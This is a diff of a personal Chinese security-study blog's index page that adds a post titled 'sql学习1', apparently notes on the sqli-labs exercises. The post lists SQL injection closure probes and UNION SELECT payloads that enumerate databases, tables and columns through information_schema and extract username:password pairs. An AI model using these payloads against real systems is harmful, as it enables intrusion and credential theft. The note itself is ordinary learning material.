@@ -64,6 +64,48 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql学习1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" class="article-date">
+  <time datetime="2021-11-22T14:36:40.000Z" itemprop="datePublished">2021-11-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/">sql学习1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sql 1<br>常见手动 sql 注入的闭合方式<br>or 1=1<br>‘or 1=1<br>“or 1=1<br>)or 1=1<br>‘)or 1=1<br>“) or 1=1<br>“))or 1=1</p>
+<p>具体使用哪种方式取决于 SQL语句使用了什么方式，我们可以在注入点输入 反斜杠 \ 来判断页面使用的哪种闭合方式</p>
+<p>\ 表示转义，直接输入 \ 会将字段的闭合方式暴露出来，因为被转义不生效，导致SQL 语句报错，并爆出闭合方式</p>
+<p>弹出： ‘1’ LIMIT 0,1 这个错。发现\转义后有一个单引号，说明此 sql 语句基于单引号闭合。<br>爆破库名<br>-1’ union select 1,2,database()–+<br>1,2,database()<br>database() 替换了字段3，作用是查询当前数据库名称，其中1，2是为了补充 第一个和第二个字段的显示结果<br>拓展，常用<br>version()    – MySQL版本<br>user()       – 数据库用户名<br>database()   – 数据库名称<br>@@datadir    – 数据库路径<br>@@version_compile_os  – 操作系统版本<br>列出当前数据库中的所有表的名称<br>5.0以下和5.0以上的区别    5.0以下没有 information_schema 这个数据表，只能爆破表<br>5.0以下多用户单操作，5.0以上多用户多操作<br>查看 information_schema 库中 tables 表名 table_schema 等于 security 的相关信息</p>
+<p>table_schema  – 该字段存储数据库名<br>table_name    – 该字段存储对应数据中的包括的表名<br>列出所有表名<br>-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database();–+<br>查询表中字段名<br>-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’数据库表的名字’–+</p>
+<p>-1’ union select 1,2,group_concat(一个或多个字段名，逗号分隔) from 表名–+或<br> union select 1,group_concat(username,0x3a,0x3a,password),3 from users –+（这里的1，2或1，3是为了构造一个数列来回显）<br>使用冒号将用户名和密码分开 0x3a<br>我们可以在每一个用户名：密码后面添加一个换行符; 0x3C,0x68,0x72,0x2F,0x3E</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://aomandetiankong.github.io/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" data-id="ckwaryndi0006jgwbdw7771hk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-黑盾杯学习3（文件包含问题）" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" class="article-date">
@@ -92,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckvjkjxjx0007i8wbdf18c69t" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwaryndm0009jgwb76r3dusz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -130,7 +172,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckvjkjxjx0006i8wbcw7312vj" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwaryndm0008jgwb1wz8aw6u" class="article-share-link">Share</a>
       
       
     </footer>
@@ -167,7 +209,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/10/21/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A01%EF%BC%88%E7%99%BB%E5%BD%95%E6%A1%86%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckvjkjxjw0004i8wb6wbv21t0" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/10/21/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A01%EF%BC%88%E7%99%BB%E5%BD%95%E6%A1%86%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwaryndi0007jgwbcj7x4jlg" class="article-share-link">Share</a>
       
       
     </footer>
@@ -205,7 +247,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/29/%E6%8C%87%E9%92%88%EF%BC%8C%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0/" data-id="ckvjkjxju0002i8wbfm5l3fqd" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/29/%E6%8C%87%E9%92%88%EF%BC%8C%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0/" data-id="ckwaryndh0004jgwbabwfg3i7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -243,7 +285,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/24/%E6%B1%82%E6%95%B0%E7%BB%84%E4%BD%8D%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ckvjkjxjs0001i8wbekic82a3" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/24/%E6%B1%82%E6%95%B0%E7%BB%84%E4%BD%8D%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ckwaryndh0005jgwbf1q720p0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -281,7 +323,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/newpapername/" data-id="ckvjkjxjw0005i8wb3e649979" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/newpapername/" data-id="ckwaryndf0002jgwbb89q8iw6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -317,7 +359,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" data-id="ckvjkjxjy0008i8wb2sj6hw87" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" data-id="ckwaryndg0003jgwbgt2nbsn5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -353,7 +395,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/My/" data-id="ckvjkjxjv0003i8wb7y60frti" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/My/" data-id="ckwarynde0001jgwb8u826a3z" class="article-share-link">Share</a>
       
       
     </footer>
@@ -402,7 +444,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/hello-world/" data-id="ckvjkjxjp0000i8wbd1g4d180" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/hello-world/" data-id="ckwarynda0000jgwb2w7ha6iy" class="article-share-link">Share</a>
       
       
     </footer>
@@ -443,6 +485,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/">sql学习1</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/">黑盾杯学习3（文件包含问题）</a>
           </li>
         
@@ -456,10 +502,6 @@
         
           <li>
             <a href="/2021/09/29/%E6%8C%87%E9%92%88%EF%BC%8C%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0/">指针，结构与函数</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/24/%E6%B1%82%E6%95%B0%E7%BB%84%E4%BD%8D%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/">求数组位数的方法</a>
           </li>
         
       </ul>
